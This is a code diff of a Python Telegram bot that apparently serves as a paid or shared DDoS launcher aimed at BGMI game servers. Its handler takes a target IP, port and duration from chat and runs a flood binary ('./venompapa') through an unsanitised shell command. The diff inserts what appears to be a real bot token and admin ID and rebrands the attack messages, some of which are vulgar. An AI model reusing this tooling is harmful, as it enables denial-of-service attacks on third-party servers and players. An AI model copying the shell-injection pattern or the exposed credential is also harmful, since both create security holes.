@@ -9,9 +9,9 @@ import time
 import threading
 
 # Insert your Telegram bot token here
-bot = telebot.TeleBot('8129833857:5fgngbf')
+bot = telebot.TeleBot('7916715600:AAH0xhGe5MBHnlurVlR6HJBbp-rAMi9M2pA')
 # Admin user IDs
-admin_id = {"5676671574"}
+admin_id = {"1604629264"}
 
 # Files for data storage
 USER_FILE = "users.json"
@@ -183,7 +183,7 @@ def handle_bgmi(message):
                     start_attack_reply(message, target, port, time_val)
                     full_command = f"./venompapa {target} {port} {time_val} 150"
                     subprocess.run(full_command, shell=True)
-                    response = f"𝐂𝐇𝐔𝐃𝐀𝐈 FINISHED 🎮\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time_val} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬"
+                    response = f"ATTACK DONE‼️\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time_val} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬"
             except ValueError:
                 response = "𝐄𝐑𝐑𝐎𝐑»𝐈𝐏 𝐏𝐎𝐑𝐓 𝐓𝐇𝐈𝐊 𝐒𝐄 𝐃𝐀𝐀𝐋 𝐂𝐇𝐔𝐓𝐘𝐄"
         else:
@@ -195,7 +195,7 @@ def handle_bgmi(message):
 def start_attack_reply(message, target, port, time_val):
     user_info = message.from_user
     username = user_info.username if user_info.username else user_info.first_name
-    response = f"{username}, 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.\n\n𝗧𝗔𝗥𝗚𝗘𝗧: {target}\n𝗣𝗢𝗥𝐓: {port}\n𝗧𝗜𝗠𝗘: {time_val} 𝗦𝗘𝗖𝗢𝗡𝗗𝗦\n𝗗𝗘𝗩𝗘𝗟𝗢𝗣𝗘𝗥: 𝗕𝗚𝗠𝗜\n𝙾𝚆𝙽𝙴𝚁 🚀"
+    response = f"{username}, 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃🔥\n\n𝗧𝗔𝗥𝗚𝗘𝗧: {target}\n𝗣𝗢𝗥𝐓: {port}\n𝗧𝗜𝗠𝗘: {time_val} 𝗦𝗘𝗖𝗢𝗡𝗗𝗦\n𝗗𝗘𝗩𝗘𝗟𝗢𝗣𝗘𝗥: PARADOX"
     bot.reply_to(message, response)
 
 @bot.message_handler(commands=['clearlogs'])
